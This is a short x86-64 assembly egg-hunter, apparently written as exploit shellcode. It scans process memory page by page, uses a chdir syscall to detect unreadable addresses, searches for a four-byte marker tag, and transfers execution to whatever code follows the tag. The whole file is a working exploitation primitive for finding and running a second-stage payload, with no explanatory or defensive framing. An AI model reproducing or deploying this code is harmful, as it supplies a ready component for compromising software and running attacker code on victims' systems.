; Author: Robert Catalin Raducioiu

global _start

section .text

_start:

    xor edi, edi
    mul rdi

    mov rdi, 0x00007fffffff0000

IncreasePage:

    or di, 0xfff

CheckAddress:

    inc rdi

    xor eax, eax
    mov al, 80
    syscall

    cmp al, 0xf2
    jz IncreasePage

CheckBytes:

    mov edx, DWORD[rdi]
    mov esi, 0x74636273
    dec esi

    cmp edx, esi

    jnz CheckAddress

    add rdi, 4
    call rdi
